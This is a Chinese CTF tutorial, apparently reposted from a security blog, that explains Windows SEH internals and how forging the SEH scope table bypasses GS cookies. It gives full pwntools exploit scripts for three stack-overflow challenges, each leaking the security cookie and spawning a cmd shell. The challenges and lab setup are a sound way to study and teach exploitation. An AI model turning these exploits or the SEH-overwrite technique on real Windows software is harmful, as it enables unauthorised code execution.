> 原文链接: https://www.anquanke.com//post/id/188170 


# Windows-pwn解题原理&amp;利用手法详解


                                阅读量   
                                **685725**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t019d6050cac83e6d9d.jpg)](https://p2.ssl.qhimg.com/t019d6050cac83e6d9d.jpg)



目前我在CTF中遇到的windows pwn题目，利用手法大多是通过伪造SEH结构体，再触发异常来getshell。之前没有太多的做这方面的题，这里我详细说一下原理和解题思路

系统主要依靠SEH机制(用户模式、内核模式)和VEH机制（仅支持用户模式）进行异常处理。下面先主要了解一下SEH机制。



## SEH相关数据结构

### <a class="reference-link" name="1.%20TIB%E7%BB%93%E6%9E%84"></a>1. TIB结构

TIB，又称线程信息块，是保存线程基本信息的数据结构，它位于TEB的头部。TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。

TIB结构如下：

```
typedef struct _NT_TIB`{`
    struct _EXCEPTION_REGISTRATION_RECORD *Exceptionlist;//指向异常处理链表
    PVOID StackBase;//当前进程所使用的栈的栈底
    PVOID StackLimit;//当前进程所使用的栈的栈顶
    PVOID SubSystemTib;
    union `{`
        PVOID FiberData;
        ULONG Version;
    `}`;
    PVOID ArbitraryUserPointer;
    struct _NT_TIB *Self;//指向TIB结构自身
`}` NT_TIB;
```

在这个结构中与异常处理有关的第一个成员：指向`_EXCEPTION_REGISTRATION_RECORD`结构的`Exceptionlist`指针

### <a class="reference-link" name="2.%20_EXCEPTION_REGISTRATION_RECORD%20%E7%BB%93%E6%9E%84"></a>2. _EXCEPTION_REGISTRATION_RECORD 结构

该结构主要用于描述线程异常处理过程的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系

结构如下：

```
typedef struct _EXCEPTION_REGISTRATION_RECORD`{`
    struct _EXCEPTION_REGISTRATION_RECORD *Next;//指向下一个结构的指针
    PEXCEPTION_ROUTINE Handler;//当前异常处理回调函数的地址
`}`EXCEPTION_REGISTRATION_RECORD;
```

结构如图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/10/09/uI9Auq.png)

伪造之后的这个结构体中的`*Next`必须是原来的，所以我们要事先泄露出来原`*Next`

### <a class="reference-link" name="3.%20SEH%20scope%20table%E7%BB%93%E6%9E%84"></a>3. SEH scope table结构

在Scope table中保存了`__try`块相匹配的 `__except` 或 `__finally`的地址值<br>
结构如下：

```
struct _EH4_SCOPETABLE `{`
        DWORD GSCookieOffset;
        DWORD GSCookieXOROffset;
        DWORD EHCookieOffset;
        DWORD EHCookieXOROffset;
        _EH4_SCOPETABLE_RECORD ScopeRecord[1];
`}`;
```

```
struct _EH4_SCOPETABLE_RECORD `{`
        DWORD EnclosingLevel;
        long (*FilterFunc)();
            union `{`
            void (*HandlerAddress)();
            void (*FinallyFunc)(); 
    `}`;
`}`;
```

如图所示：

[![](https://s2.ax1x.com/2019/10/09/uIpn1A.png)](https://s2.ax1x.com/2019/10/09/uIpn1A.png)

windows pwn的关键就是伪造`scope table`结构体，它地址位于栈上的位置在`ebp-0x8`，存的值是和`___security_cookie`异或之后的结果，所以我们要想伪造它，就必须先泄露出来`___security_cookie`的值

该把`scope table`结构体伪造成什么呢？<br>
当程序触发异常后，会执行类似这样的代码：

```
.text:00401B50                 push    ebp
.text:00401B51                 mov     ebp, esp
.text:00401B53                 mov     eax, [ebp+arg_C]
.text:00401B56                 push    eax
.text:00401B57                 mov     ecx, [ebp+arg_8]
.text:00401B5A                 push    ecx
.text:00401B5B                 mov     edx, [ebp+arg_4]
.text:00401B5E                 push    edx
.text:00401B5F                 mov     eax, [ebp+arg_0]
.text:00401B62                 push    eax
.text:00401B63                 push    offset j_@__security_check_cookie@4 ; __security_check_cookie(x)
.text:00401B68                 push    offset ___security_cookie
.text:00401B6D                 call    _except_handler4_common
.text:00401B72                 add     esp, 18h
.text:00401B75                 pop     ebp
.text:00401B76                 retn
.text:00401B76 SEH_4013A0      endp
```

上述代码中调用了`_except_handler4_common`，那么在`_except_handler4_common`函数中干了些什么呢？接着往下看…

该代码段参考：[except.c](http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html)

```
void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)
`{`
    unsigned int v3; // esi@2
    unsigned int v4; // esi@3

    if ( scopeTable-&gt;GSCookieOffset != -2 )
    `{`
        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];
        __guard_check_icall_fptr(cookieCheckFunction);
        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);
    `}`
    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];
    __guard_check_icall_fptr(cookieCheckFunction);
    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);
`}`

int __cdecl _except_handler4_common(unsigned int *securityCookies, void (__fastcall *cookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *exceptionRecord, unsigned __int32 sehFrame, _CONTEXT *context)
`{`
    // 异或解密 scope table
    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + 8));

    // sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置
    framePointer = (char *)(sehFrame + 16);
    scopeTable = scopeTable_1;

    // 验证 GS
    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (char *)(sehFrame + 16));
    __except_validate_context_record(context);

    if ( exceptionRecord-&gt;ExceptionFlags &amp; 0x66 )
    `{`
        ......
    `}`
    else
    `{`
        exceptionPointers.ExceptionRecord = exceptionRecord;
        exceptionPointers.ContextRecord = context;
        tryLevel = *(_DWORD *)(sehFrame + 12);
        *(_DWORD *)(sehFrame - 4) = &amp;exceptionPointers;
        if ( tryLevel != -2 )
        `{`
            while ( 1 )
            `{`
                v8 = tryLevel + 2 * (tryLevel + 2);
                filterFunc = (int (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);
                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((char *)scopeTable_1 + 4 * v8);
                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;
                scopeTableRecord_1 = scopeTableRecord;
                if ( filterFunc )
                `{`
                    // 调用 FilterFunc
                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);
                    ......
                    if ( filterFuncRet &gt; 0 )
                    `{`
                        ......
                        // 调用 HandlerFunc
                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + 16);
                        ......
                    `}`
                `}`
                ......
                tryLevel = encloseingLevel;
                if ( encloseingLevel == -2 )
                    break;
                scopeTable_1 = scopeTable;
            `}`
            ......
        `}`
    `}`
  ......
`}`
```

在函数中先后调用了`scope table`结构体中的`FilterFunc`函数和`HandlerFunc`函数，那么我们就可以伪造这两个函数地址为我们的shell代码地址，当触发异常时就会执行shell代码，即可获取到shell

### <a class="reference-link" name="4.%20%E5%85%B6%E4%BB%96"></a>4. 其他

通过查看汇编我们发现在栈上还有一个特殊的值，位置在`ebp-0x1c`处

[![](https://s2.ax1x.com/2019/10/09/uIFey9.png)](https://s2.ax1x.com/2019/10/09/uIFey9.png)

而`scope table`结构体地址在它的下面，所以我们必须还要伪造这个值。伪造它由两种方法，第一种把他泄露出来，构造payload的时候再填充进去即可；另一种方法就是计算出来：`值=___security_cookie^ebp`



## 示例

### 1.`BABYSTACK`

该题目是一个windows平台下的pwn，利用的正是覆盖SEH结构体来getshell，载入IDA中看代码流程

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
`{`
  FILE *v3; // eax
  FILE *v4; // eax
  _DWORD *v5; // ST38_4
  int v6; // [esp+20h] [ebp-C0h]
  int v7; // [esp+24h] [ebp-BCh]
  signed int i; // [esp+2Ch] [ebp-B4h]
  char v9; // [esp+44h] [ebp-9Ch]
  CPPEH_RECORD ms_exc; // [esp+C8h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = (FILE *)_acrt_iob_func(1);
  setvbuf(v3, 0, 4, 0);
  v4 = (FILE *)_acrt_iob_func(0);
  setvbuf(v4, 0, 4, 0);
  puts("ouch! Do not kill me , I will tell you everything");
  sub_401420("stack address = 0x%xn", &amp;v9);
  sub_401420("main address = 0x%xn", main);
  for ( i = 0; i &lt; 10; ++i )
  `{`
    puts("Do you want to know more?");
    sub_401000((int)&amp;v9, 10);
    v7 = strcmp(&amp;v9, "yes");
    if ( v7 )
      v7 = -(v7 &lt; 0) | 1;
    if ( v7 )
    `{`
      v6 = strcmp(&amp;v9, "no");
      if ( v6 )
        v6 = -(v6 &lt; 0) | 1;
      if ( !v6 )
        break;
      sub_401000((int)&amp;v9, 256);
    `}`
    else
    `{`
      puts("Where do you want to know");
      v5 = (_DWORD *)sub_401060();
      sub_401420("Address 0x%x value is 0x%xn", v5, *v5);
    `}`
  `}`
  ms_exc.registration.TryLevel = -2;
  puts("I can tell you everything, but I never believe 1+1=2");
  puts("AAAA, you kill me just because I don't think 1+1=2??");
  exit(0);
`}`
```

审计之后发现`sub_401000((int)&amp;v9, 256);`存在栈溢出，能够覆盖到`ebp`的位置

并且在看main的汇编时发现一个`shell`

```
.text:0040138D                 push    offset Command  ; "cmd"
.text:00401392                 call    ds:system
```

程序提供给我们`v9`在栈上的地址和`main`函数的地址

根据程序已经提供给我们的信息，下面描述具体攻击流程：
<li>泄露`___security_cookie`，它的地址可以通过相对于`main函数`的偏移计算出来：`main_addr+0x2f54`
</li>
<li>泄露`_EXCEPTION_REGISTRATION_RECORD`结构体中`Next`成员：`ebp-0x10`
</li>
<li>泄露`GS`的值，它的地址在`ebp-0x1c`，可以通过`&amp;v9`偏移计算出来：`&amp;v9+0x80`
</li>
- 伪造`hardler`结构体
```
SEH_scope_table = p32(0x0FFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF20)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)
```
- 通过栈溢出对内存进行覆盖
- 使程序异常来触发执行伪造的代码段
Exp：

```
from pwn import *
from LibcSearcher import *
context.log_level='debug'
ip = '192.168.1.103'
prot = '1234'
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
r = remote(ip,prot)
ru("stack address = ")
stack_addr = eval(rud("rn"))
li("stack_addr",stack_addr)
ru("main address = ")
main_addr = eval(rud("rn"))
li("main_addr",main_addr)
ru("Do you want to know more?rn")
sl("yes")
ru("Where do you want to know")
___security_cookie_addr = main_addr+0x2f54

sl(str(___security_cookie_addr))
ru("value is ")
___security_cookie_value = eval(rud("rn"))
li("___security_cookie_value",___security_cookie_value)
ru("Do you want to know more?rn")
sl("yes")
ru("Where do you want to know")
shell_addr = main_addr+733
ebp = stack_addr+0x9c
Next_addr =  ebp-0x10
sl(str(Next_addr))
ru("value is ")
Next_value = eval(rud("rn"))
li("Next_value",Next_value)
SEH_scope_table = p32(0x0FFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF20)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)

pay_3 = "a"*4+SEH_scope_table.ljust(0x80-4,"x22")+p32(ebp^___security_cookie_value)+"b"*8+p32(Next_value)+p32(main_addr + 944)+p32((stack_addr+4)^___security_cookie_value)+p32(0)
ru("Do you want to know more?rn")
sl("n")
sl(pay_3)
ru("Do you want to know more?rn")
sl('yes')
ru('Where do you want to know')
sl('0')
ri()
```

### <a class="reference-link" name="2.%20%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%86%B3%E8%B5%9B-%E2%80%9C%E4%B9%9D%E6%9E%9C%E2%80%9D"></a>2. 第五空间决赛-“九果”

这道题当时没写出来（当时没做过win pwn，哭了），现在回过头来看这道题，和上一道`babystack`真的是神相似

`main`函数：

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
`{`
  FILE *v3; // eax
  FILE *v4; // eax
  _DWORD *v5; // ST38_4
  int v6; // [esp+20h] [ebp-C0h]
  int v7; // [esp+24h] [ebp-BCh]
  signed int i; // [esp+2Ch] [ebp-B4h]
  char v9; // [esp+44h] [ebp-9Ch]
  CPPEH_RECORD ms_exc; // [esp+C8h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = (FILE *)_acrt_iob_func(1);
  setvbuf(v3, 0, 4, 0);
  v4 = (FILE *)_acrt_iob_func(0);
  setvbuf(v4, 0, 4, 0);
  puts("Welcome to the Fifth CyberSecutiry FinalBattle!..");
  sub_401420("stack address = 0x%xn", &amp;v9);
  sub_401420("main address = 0x%xn", main);
  for ( i = 0; i &lt; 10; ++i )
  `{`
    puts("OtherwhereWillBeTheAnswer");
    sub_401000(&amp;v9, 10);
    v7 = strcmp(&amp;v9, "yes");
    if ( v7 )
      v7 = -(v7 &lt; 0) | 1;
    if ( v7 )
    `{`
      v6 = strcmp(&amp;v9, "tj");
      if ( v6 )
        v6 = -(v6 &lt; 0) | 1;
      if ( !v6 )
        break;
      sub_401000(&amp;v9, 256);
    `}`
    else
    `{`
      puts("Where do you want to know");
      v5 = (_DWORD *)sub_401060();
      sub_401420("Address 0x%x value is 0x%xn", v5, *v5);
    `}`
  `}`
  ms_exc.registration.TryLevel = -2;
  puts("....................................................");
  puts("AAAA, Something goes wrong Please check your script?");
  exit(0);
`}`
```

同样是存在栈溢出和异常处理，方法思路和上一个题目是一摸一样的

Exp：

```
from pwn import *
from LibcSearcher import *
context.log_level='debug'
ip = '192.168.1.103'
prot = '9999'
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
r = remote(ip,prot)
ru("stack address = ")
stack_addr = eval(rud("rn"))
li("stack_addr",stack_addr)
ru("main address = ")
main_addr = eval(rud("rn"))
li("main_addr",main_addr)
ru("OtherwhereWillBeTheAnswerrn")
sl("yes")
ru("Where do you want to know")
___security_cookie_addr = main_addr+0x2f54

sl(str(___security_cookie_addr))
ru("value is ")
___security_cookie_value = eval(rud("rn"))
li("___security_cookie_value",___security_cookie_value)
ru("OtherwhereWillBeTheAnswerrn")
sl("yes")
ru("Where do you want to know")
shell_addr = main_addr+733
ebp = stack_addr+0x9c
Next_addr =  ebp-0x10
sl(str(Next_addr))
ru("value is ")
Next_value = eval(rud("rn"))
li("Next_value",Next_value)
SEH_scope_table = p32(0x0FFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF20)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)

pay_3 = "a"*4+SEH_scope_table.ljust(0x80-4,"x22")+p32(ebp^___security_cookie_value)+"b"*8+p32(Next_value)+p32(main_addr + 944)+p32((stack_addr+4)^___security_cookie_value)+p32(0)
ru("OtherwhereWillBeTheAnswerrn")
sl("n")
sl(pay_3)
ru("OtherwhereWillBeTheAnswerrn")
sl('yes')
ru('Where do you want to know')
sl('0')
ri()
```

### <a class="reference-link" name="3.%202019SUCTF-babystack"></a>3. 2019SUCTF-babystack

这道题相当于是前两道题的进阶，换汤不换药，getshell手法是一样的

> 原题目留的后门是`type flag.txt`，为了方便，我把后门换成`cmd`，可以直接打开shell

main函数流程很简单

```
void __noreturn sub_401820()
`{`
  int v0; // ebx
  FILE *v1; // eax
  FILE *v2; // eax
  signed int v3; // ecx
  char v4; // dl
  __int64 v5; // [esp+18h] [ebp-28h]
  char v6; // [esp+20h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+28h] [ebp-18h]

  v5 = 0i64;
  v6 = 0;
  v0 = 0;
  v1 = _acrt_iob_func(0);
  setbuf(v1, 0);
  v2 = _acrt_iob_func(1);
  setbuf(v2, 0);
  sub_401028("  ____        _            _____ _             _    n");
  sub_401028(" |  _ \      | |          / ____| |           | |   n");
  sub_401028(" | |_) | __ _| |__  _   _| (___ | |_ __ _  ___| | __n");
  sub_401028(" |  _ &lt; / _` | '_ \| | | |\___ \| __/ _` |/ __| |/ /n");
  sub_401028(" | |_) | (_| | |_) | |_| |____) | || (_| | (__|   &lt; n");
  sub_401028(" |____/ \__,_|_.__/ \__, |_____/ \__\__,_|\___|_|\_\n");
  sub_401028("                     __/ |                          n");
  sub_401028("                    |___/                           n");
  puts("Hello,I will give you some gifts");
  sub_401028("stack address = 0x%Xn");
  sub_401028("main address = 0x%Xn");
  sub_401028("So,Can You Tell me what did you know?n");
  ms_exc.registration.TryLevel = 0;
  sub_4010B9("%s", &amp;v5, 9);
  if ( strlen(&amp;v5) == 8 )
  `{`
    v3 = 0;
    while ( v3 &lt; 8 )
    `{`
      v4 = *(&amp;v5 + v3);
      if ( (v4 - 48) &gt; 9u )
      `{`
        if ( (v4 - 65) &lt;= 5u )
          v0 = v4 + 16 * v0 - 55;
        ++v3;
      `}`
      else
      `{`
        v0 = v4 + 16 * (v0 - 3);
        ++v3;
      `}`
    `}`
    sub_401028("You can not find Me!n");
    exit(0);
  `}`
  sub_401028("Error!n");
  exit(0);
`}`
```

同样程序泄露了一个栈上变量的地址（栈地址）和`main`函数的地址，但是如果单纯用IDA来f5查看伪C代码的话看不出来具体发生异常的代码在哪，所以还需要审查一下汇编代码，果然发现一处比较可疑的代码

[![](https://s2.ax1x.com/2019/10/09/uIpCOx.png)](https://s2.ax1x.com/2019/10/09/uIpCOx.png)

这里可能会发生”除0异常“，向上寻找一下给`esi`赋值的地方

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/10/09/uIpkTO.png)

可以发现，先是`ebx`的值赋值给`esi`，继而执行了`sub     esi, eax`，我们知道`ebx`是我们输入的字符串转换成16进制数（比如说输入12345678，转换成ebx=0x12345678），如果我们输入的和`eax`相等的话，那么就可以发生”除0异常“

动态调式一下执行`sub     esi, eax`前，`eax`的值是多少

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/10/09/uIpEkD.png)<br>
可以发现`eax`的值是`.text`段上的，经过测试后发现与泄露出来的main函数的地址偏移是一样的，所以我们可以通过程序提供的main函数的地址直接算出来可以发生异常的地址，经过计算得出： `触发异常地址=main_addr+2083`

程序发生异常后来到`sub_04013A0`：

```
void __noreturn sub_4013A0()
`{`
  FILE *v0; // eax
  int v1; // ST08_4
  int v2; // [esp+18h] [ebp-DCh]
  int v3; // [esp+1Ch] [ebp-D8h]
  signed int i; // [esp+38h] [ebp-BCh]
  char Dst; // [esp+48h] [ebp-ACh]
  char Str[4]; // [esp+C8h] [ebp-2Ch]
  int v7; // [esp+CCh] [ebp-28h]
  int v8; // [esp+D0h] [ebp-24h]
  int v9; // [esp+D4h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+DCh] [ebp-18h]

  memset(&amp;Dst, 0, 0x80u);
  *Str = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  sub_401028("Oops,You find Me!n");
  sub_401028("OK,I can tell you somethingn");
  ms_exc.registration.TryLevel = 0;
  for ( i = 0; i &lt; 10; ++i )
  `{`
    sub_401028("Do you want to know more?n");
    sub_4010B9("%s", &amp;Dst, 8);
    getchar();
    v3 = strcmp(&amp;Dst, "yes");
    if ( v3 )
      v3 = -(v3 &lt; 0) | 1;
    if ( v3 )
    `{`
      v2 = strcmp(&amp;Dst, "no");
      if ( v2 )
        v2 = -(v2 &lt; 0) | 1;
      if ( !v2 )
        break;
      v0 = _acrt_iob_func(0);
      fgets(&amp;Dst, 256, v0);
    `}`
    else
    `{`
      sub_401028("Where do you want to know?n");
      sub_4010B9("%s", Str, 16);
      v1 = *atoi(Str);
      sub_401028("Address 0x%X value is 0x%Xn");
    `}`
  `}`
  ms_exc.registration.TryLevel = -2;
  sub_401028("Now,I will tell you 1 + 1 = 3!n");
  sub_401028("Oh,no!n");
  sub_401028("You don't believe 1 + 1 = 3???n");
  sub_401028("You do calculation like cxk!!!n");
  exit(0);
`}`
```

这是发生过异常后跳转过来的函数，在`x32dbg`中好像不能够进去（或者是我技术太菜了），这里用Ex师傅的工具来搭建一下环境，[传送门](https://github.com/Ex-Origin/win_server)

成功之后通过`pwntools`连接，然后用`x32dbg`附加进程即可调试

接下来的操作和前两道题是一样的，这里不在详解。但是有一点是需要注意的

原来`payload`是：

```
SEH_scope_table = p32(0x0FFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF20)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)

pay_3 = "a"*4+SEH_scope_table.ljust(0x80-4,"x22")+p32(ebp^___security_cookie_value)+"b"*8+p32(Next_value)+p32(main_addr + 944)+p32((stack_addr+4)^___security_cookie_value)+p32(0)
```

直接套这个模板是不行的，经过调试后发现
<li>
`SEH_scope_table`是不一样的
<pre><code class="hljs makefile">SEH_scope_table = p32(0xFFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF0c)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)
</code></pre>
</li>
<li>
`&amp;Dst+4`的位置上会覆盖成`0xfefefefe`，具体原因不清楚，我们要绕过这里，前面由4个”a“，变成8个”a“，即可绕过</li>
最终`payload`：

```
pay = "a"*8+SEH_scope_table.ljust(0x90-8,"a")+p32(___security_cookie_value^(ebp))+"a"*8+p32(Next_value)+p32(main_addr + 0x9f2)+p32(((ebp-0xac)+8)^___security_cookie_value)+p32(0)
```

Exp：

```
from pwn import *
from LibcSearcher import *
context.log_level='debug'
ip = '192.168.1.103'
prot = '1001'
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
r = remote(ip,prot)
# r.sendlineafter("&gt;","BabyStack.exe")
ru("stack address = ")
stack_addr = eval(rud("rn"))
li("stack_addr",stack_addr)
ru("main address = ")
main_addr = eval(rud("rn"))
li("main_addr",main_addr)
except_addr = main_addr+2083
ebp = stack_addr-32
ru("So,Can You Tell me what did you know?rn")
sl((hex(except_addr)[2:].upper()).rjust(8,"0"))
shell_addr = main_addr+1357

SEH_scope_table = p32(0xFFFFFFE4)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFF0c)
SEH_scope_table += p32(0)
SEH_scope_table += p32(0xFFFFFFFE)
SEH_scope_table += p32(shell_addr)

___security_cookie_addr = main_addr+0x5ea6
ru("Do you want to know more?rn")
sl("yes")
ru("Where do you want to know?rn")
sl(str(___security_cookie_addr))
ru("value is ")

___security_cookie_value = eval(rud("rn"))
li("___security_cookie_value",___security_cookie_value)
ru("Do you want to know more?rn")
sl("yes")
ru("Where do you want to know?rn")
Next_addr =  ebp-0x10
sl(str(Next_addr))
ru("value is ")
Next_value = eval(rud("rn"))
li("Next_value",Next_value)
ru("Do you want to know more?rn")
sl("y")
pay = "a"*8+SEH_scope_table.ljust(0x90-8,"a")+p32(___security_cookie_value^(ebp))+"a"*8+p32(Next_value)+p32(main_addr + 0x9f2)+p32(((ebp-0xac)+8)^___security_cookie_value)+p32(0)
sl(pay)
ru("Do you want to know more?rn")
sl("yes")
ru("Where do you want to know?rn")
sl("0")
ri()
```



## 总结

`win pwn`其实和`linux pwn`差不多，不一样的只是利用手法。

本文如有不妥之处，敬请斧正。



## 参考文献

[https://bbs.pediy.com/thread-221016.htm](https://bbs.pediy.com/thread-221016.htm)<br>[http://blog.eonew.cn/archives/1182](http://blog.eonew.cn/archives/1182)<br>[https://blog.csdn.net/magictong/article/details/7517630](https://blog.csdn.net/magictong/article/details/7517630)
